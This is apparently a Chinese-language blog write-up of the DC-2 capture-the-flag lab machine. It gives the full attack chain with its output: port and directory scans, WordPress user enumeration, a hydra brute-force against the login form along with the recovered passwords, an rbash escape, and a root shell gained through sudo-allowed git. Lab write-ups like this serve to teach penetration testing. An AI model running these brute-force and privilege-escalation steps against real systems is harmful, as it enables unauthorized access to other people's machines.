<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A -v 192.168.33.137 		&#x2F;&#x2F;-v是增强搜索效果，-vv更强</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">结果：</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">80&#x2F;tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http:&#x2F;&#x2F;dc-2&#x2F;</span><br><span class="line">7744&#x2F;tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">| ssh-dss AAAAB3NzaC1kc3MAAACBAMT3xv0ReIK733JHqB5o5t1Knur7MHfTeYoqdn2fxpfdk79iDYAD46e&#x2F;C1hLs6R0CH1fSWfpJ0x45g77ZaEn&#x2F;nOaR2UXiod20R6kyrAPyL4UELizECoJ9MdHSULedr0+4QcXhtUZ+4b76umJhENpOhH+vZjrjMI5uZo+EMjlylxFAAAAFQDzg8StOWpV7J5ZjSfIdcddFgqB&#x2F;QAAAIA84WMMKmOEkvzgQZLuW5lTTecIrk+UXJyWVZSZFxvFbnt5mUvEzPBMqPZIo1h1dkzpEp1Xpk9Vb16LMrQcS6LgH8yhlo5402lUCfP6onxVNvGvP5uhLoQVjzPd65ZKJ7J1VSoz9xOmPkWr2HFuCf6XOBXy8WCxqZxWYTYERTuexgAAAIAI8DjfDmIjv0jUBAPZu0crpPoxvK4ZvdEy6UbfjK+pZYzkd6qnVLdWrvP9evbWaA5VoDZjWp1301VjX8Y1pqHFVaRUu3OBY7DgidJXA3zLd1BSdPzYfRJSZ1&#x2F;xN75Yo13wW6XIEsy1kvUNOwA0Nm6zmcQ+SN&#x2F;aBITwGOIBGrp06w&#x3D;&#x3D;</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC92AIbO8wDuOXLMCrnJkTKDLxXzpwFY0EI4urz6cZpmOjGOZYbWz6Ele1sM3WXEWmOWkszLrMbVEFmuYan545oIHnylYX6ZY+eMPjJBRH&#x2F;VDukRsNtAA8VRsvIkfCtcG5J9zAQTQDYYprEJljKPYavf4bIW3NZb0v57O01tGylLh23ZSfGpTmQXx+GsWet9vnbCr1+bzf&#x2F;QeZ7PNK9BeBsLJsvWgLQmuaTdBYeW1b415xOaszWrutHQoaBdud&#x2F;SPX1Uvy2PNFUfKIPjdbmAdRxTAvRHHaMTRdrvEhdJWz3wmefXr9e3S3YEu05USTqhMwi6OBxeqkjc+6mdR&#x2F;PYR9</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE329BkKjKxz7Y23cZSshQ76Ge3DFsJsTO89pgaInzX6w5G3h6hU3xDVMD8G8BsW3V0CwXWt1fTnT3bUc+JhdcE&#x3D;</span><br><span class="line">|   256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGyWHwWC3fLufEnM1R2zsvjMZ1TovPCp3mky&#x2F;2s+wXTH</span><br></pre></td></tr></table></figure>





<p>我们访问80端口：</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-2.png" alt="2-2"></p>
<p>我们发现被重定向到dc-2，于是我们可以配置静态路由，直接用<strong>域名访问</strong>。</p>
<blockquote>
<p>配置静态路由：</p>
<p>linux：/etc/hosts</p>
<p>windows:C:\Windows\System32\drivers\etc\hosts</p>
</blockquote>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-3.png" alt="2-3"></p>
<p>扫描一下目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[08:06:37] Starting: </span><br><span class="line">[08:06:46] 200 -   52KB - &#x2F;index.php                                                                                                    </span><br><span class="line">[08:06:47] 200 -   19KB - &#x2F;license.txt                                                                  </span><br><span class="line">[08:06:49] 200 -    7KB - &#x2F;readme.html                                                         </span><br><span class="line">[08:06:51] 301 -  319B  - &#x2F;wp-admin  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-admin&#x2F;                                          </span><br><span class="line">[08:06:52] 301 -  321B  - &#x2F;wp-content  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-content&#x2F;</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-content&#x2F;                </span><br><span class="line">[08:06:52] 200 -   69B  - &#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php                               </span><br><span class="line">[08:06:52] 500 -    0B  - &#x2F;wp-content&#x2F;plugins&#x2F;hello.php                       </span><br><span class="line">[08:06:52] 200 -    1B  - &#x2F;wp-admin&#x2F;admin-ajax.php           </span><br><span class="line">[08:06:52] 302 -    0B  - &#x2F;wp-admin&#x2F;  -&gt;  http:&#x2F;&#x2F;dc-2&#x2F;wp-login.php?redirect_to&#x3D;http%3A%2F%2F192.168.33.137%2Fwp-admin%2F&amp;reauth&#x3D;1</span><br><span class="line">[08:06:52] 301 -  322B  - &#x2F;wp-includes  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-includes&#x2F;</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-config.php                         </span><br><span class="line">[08:06:52] 200 -    2KB - &#x2F;wp-login.php</span><br><span class="line">[08:06:52] 200 -   40KB - &#x2F;wp-includes&#x2F;   </span><br><span class="line">[08:06:52] 302 -    0B  - &#x2F;wp-signup.php  -&gt;  http:&#x2F;&#x2F;dc-2&#x2F;wp-login.php?action&#x3D;register</span><br><span class="line">[08:06:52] 500 -    0B  - &#x2F;wp-includes&#x2F;rss-functions.php</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-cron.php</span><br><span class="line">[08:06:53] 500 -    4KB - &#x2F;wp-admin&#x2F;setup-config.php</span><br><span class="line">[08:06:53] 405 -   42B  - &#x2F;xmlrpc.php</span><br><span class="line">[08:06:53] 200 -    1KB - &#x2F;wp-admin&#x2F;install.php</span><br></pre></td></tr></table></figure>





<h2 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h2><p>发现flag1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.	</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>



<h2 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h2><p>我们可以使用提示里的cewl来爬取有关密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;dc-2&#x2F; -w dc2.txt</span><br></pre></td></tr></table></figure>

<p>再用wpscan列出一些用户名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; --enumerate u</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;dc-2&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;dc-2&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>

<p>然后我们可以bp爆破，也可以hydra爆破：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt  -P passwd.txt dc-2 http-form-post &#39;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location&#39;</span><br></pre></td></tr></table></figure>

<p>也可以用wpscan直接爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P  wordlist.txt</span><br></pre></td></tr></table></figure>







<h2 id="问题1【hydra】"><a href="#问题1【hydra】" class="headerlink" title="问题1【hydra】"></a>问题1【hydra】</h2><blockquote>
<p>抓包的POST数据是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log&#x3D;admin&amp;pwd&#x3D;sit&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;testcookie&#x3D;1</span><br></pre></td></tr></table></figure>

<p>为啥要改成上述样子？？？</p>
</blockquote>
<p>爆出两个密码，登录一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-04-13 08:39:16</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3&#x2F;p:238), ~45 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;dc-2:80&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location</span><br><span class="line">[80][http-post-form] host: dc-2   login: tom   password: parturient</span><br><span class="line">[80][http-post-form] host: dc-2   login: jerry   password: adipiscing</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2021-04-13 08:40:02</span><br></pre></td></tr></table></figure>



<p>登录jerry，找到flag2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>





<h2 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h2><p>正常msfconsole受阻了，想起之前一个7744端口，尝试ssh登录，成功登录tom账号，发现flag3.txt，但是无法使用cat等命令<img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-4.png" alt="2-4"></p>
<p><strong>法一</strong>：vi可以使用【不过感觉有点小聪明】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>



<p><strong>法二</strong>：绕过rbash，切换/bin/bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>



<h2 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h2><p>看到flag3的内容想到是要给tom提权。</p>
<p>后来发现flag4只要切换jerry就可以了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>

<p>这个finalflag大概率是要在root目录下获取了。【可能还是和git有关】</p>
<h2 id="thefinalflag-1"><a href="#thefinalflag-1" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>使用tom来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>发现不行，于是切换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>

<p>来执行，发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;git</span><br></pre></td></tr></table></figure>

<p>发现可以无密码执行root的git！</p>
<p>关于git提权可以看<a href="https://gtfobins.github.io/gtfobins/git/#limited-suid" target="_blank" rel="noopener">这个</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>提权完即可发现finalflag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># cat final-flag.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">&#x2F; &#x2F; &#x2F;\ \ \___| | |   __| | ___  _ __   ___  &#x2F; \</span><br><span class="line">\ \&#x2F;  \&#x2F; &#x2F; _ \ | |  &#x2F; _&#96; |&#x2F; _ \| &#39;_ \ &#x2F; _ \&#x2F;  &#x2F;</span><br><span class="line"> \  &#x2F;\  &#x2F;  __&#x2F; | | | (_| | (_) | | | |  __&#x2F;\_&#x2F; </span><br><span class="line">  \&#x2F;  \&#x2F; \___|_|_|  \__,_|\___&#x2F;|_| |_|\___\&#x2F;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#39;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>





<p>SUID提权：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br></pre></td></tr></table></figure>

<p>发现不太行</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">George</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/">http://yoursite.com/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><div class="addthis_inline_share_toolbox pull-right"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=undefined" async></script><nav id="pagination"><div class="next-post pull-right"><a href="/2021/03/21/linux100%E8%AE%B2/"><span>linux100讲</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>